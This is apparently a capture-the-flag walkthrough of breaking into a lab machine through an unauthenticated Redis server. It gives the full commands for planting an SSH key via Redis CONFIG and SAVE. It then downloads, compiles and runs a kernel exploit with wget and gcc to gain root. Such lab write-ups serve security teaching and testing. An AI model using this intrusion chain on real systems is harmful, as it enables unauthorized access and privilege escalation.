# Redis

By exploiting the Redis' vulnerability presented by antirez in
[his blog post](http://antirez.com/news/96), we'll try to get access to the
target machine.

## Port scanning to identify Redis

Let's try to scan the target machine (`canyoupwnme`) with `nmap`

    $ nmap -A -T4 -sT -p1-65535 canyoupwnme
    ...
    1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
    ...
    6379/tcp  open  redis       Redis key-value store
    ...

Seems that Redis is binded on the default port and SSH on custom port 1322.

## Check for Redis AUTH

By using `telnet`, verify if Redis requires authentication

    $ telnet canyoupwnme 6379
    Trying 10.0.100.195...
    Connected to canyoupwnme.pentest.
    Escape character is '^]'.
    echo "You can pwn me!!!"
    $15
    You can pwn me!!!
    quit
    +OK
    Connection closed by foreign host.

Yep! Redis does not require AUTH. Before going ahead, let's get some system
information via Redis `INFO` command

    $ redis-cli -h canyoupwnme
    canyoupwnme:6379> INFO
    # Server
    redis_version:3.0.7
    ...
    os:Linux 3.19.0-25-generic i686
    arch_bits:32
    ...
    gcc_version:4.8.4
    ...
    config_file:/etc/redis/6379.conf
    ...

## Preparing the SSH key

The antirez's attack exploits Redis to upload the SSH pubkey on the target
machine. Let's start by creating a new set of keys that we use to access the
machine.

    $ mkdir ssh-redis
    $ ssh-keygen -f ./ssh-redis/attacker

## Identify the right path on the target machine

By using `redis-cli` tool as oracle, we identify user's home path(s). The idea
is to exploit the `redis-cli` return messages.

    $ redis-cli -h canyoupwnme CONFIG SET dir "/root"
    OK

    $ redis-cli -h canyoupwnme CONFIG SET dir "/xxx/yyy"
    (error) ERR Changing directory: No such file or directory

By using a usernames wordlist and a simple Python script we iterate over all
the usernames in order to check all the paths formed as follows

    /home/<username>/.ssh

After a while, we get the following path

    /home/user/.ssh

## Do the attack

As indicated by antirez, the idea at the base of the attack is to use the
`SAVE` command to overwrite the `authorized_keys` file of the victim. All the
attack's steps are well explained in the antirez's blog.

*   Generating the blob to be injected

        $ echo -e '\n\n' >> blob.txt
        $ cat ssh-redis/attacker.pub >> blob.txt
        $ echo -e '\n\n' >> blob.txt

*   Getting the current Redis' configuration (`dir` is already set due to the
    previous path's identification phase)

        $ redis-cli -h canyoupwnme
        canyoupwnme:6379> CONFIG GET dir
        1) "dir"
        2) "/home/user/.ssh"
        canyoupwnme:6379> CONFIG GET dbfilename
        1) "dbfilename"
        2) "dump.rdb"

*   Update the Redis' configuration

        $ redis-cli -h canyoupwnme
        canyoupwnme:6379> CONFIG SET dbfilename "authorized_keys"
        canyoupwnme:6379> CONFIG GET dir
        1) "dir"
        2) "/home/user/.ssh"
        canyoupwnme:6379> CONFIG GET dbfilename
        1) "dbfilename"
        2) "authorized_keys"

*   Do the attack

        $ # flushing the current Reids' db
        $ redis-cli -h canyoupwnme flushall
        OK
        $ # set the `sshblob` key with the SSH pubkey value
        $ cat blob.txt | redis-cli -h canyoupwnme -x set sshblob
        OK
        $ # save the current db in /home/user/.ssh/authorized_keys file
        $ redis-cli -h canyoupwnme save
        OK

*   Try the SSH login

        $ ssh -l user -i ssh-redis/attacker canyoupwnme -p1322

          G:                ,;
          E#,    :        f#i                        .Gt  t    j.
          E#t  .GE      .E#t                        j#W:  Ej   EW,
          E#t j#K;     i#W,     t      .DD.       ;K#f    E#,  E##j
          E#GK#f      L#D.      EK:   ,WK.      .G#D.     E#t  E###D.
          E##D.     :K#Wfff;    E#t  i#D       j#K;       E#t  E#jG#W;
          E##Wi     i##WLLLLt   E#t j#f      ,K#f   ,GD;  E#t  E#t t##f
          E#jL#D:    .E#L       E#tL#i        j#Wi   E#t  E#t  E#t  :K#E:
          E#t ,K#j     f#E:     E#WW,          .G#D: E#t  E#t  E#KDDDD###i
          E#t   jD      ,WW;    E#K:             ,K#fK#t  E#t  E#f,t#Wi,,,
          j#t            .D#;   ED.                j###t  E#t  E#t  ;#W:
           ,;              tt   t                   .G#t  E#t  DWi   ,KK:
                                                      ;;  ,;.

                                                           by canyoupwn.me

        Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

         * Documentation:  https://help.ubuntu.com/

          System information as of Fri Apr 15 10:50:08 EEST 2016

          System load: 0.0               Memory usage: 3%   Processes:       79
          Usage of /:  32.5% of 6.50GB   Swap usage:   0%   Users logged in: 0

          Graph this data and manage this system at:
            https://landscape.canonical.com/

        151 packages can be updated.
        79 updates are security updates.

        Last login: Thu Apr 14 20:02:53 2016 from kali.pentest
        user@canyoupwnme:~$ whoami
        user
        user@canyoupwnme:~$ pwd
        /home/user

## Getting `root` privileges

We got access in the target machine. Now let's try to get a `root` access. We
already obtained the kernel version with Redis `INFO` command.
Just to be sure...

    $ uname -a
    Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux

The kernel version is `3.19.0-25-generic` that was built on
`Fri Jul 24 21:18:00 UTC 2015`. After a while, the following exploit seems to
be ok

    https://www.exploit-db.com/exploits/39166

Let's try it...

    $ pwd
    /home/user
    $ id
    uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),115(lpadmin)
    $ mkdir tmp
    $ cd tmp
    $ wget https://www.exploit-db.com/download/39166 -O poc.c
    $ gcc poc.c -o poc.bin
    $ ./poc.bin
    # id
    # uid=0(root) gid=1000(user) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),115(lpadmin),1000(user)

Got it!
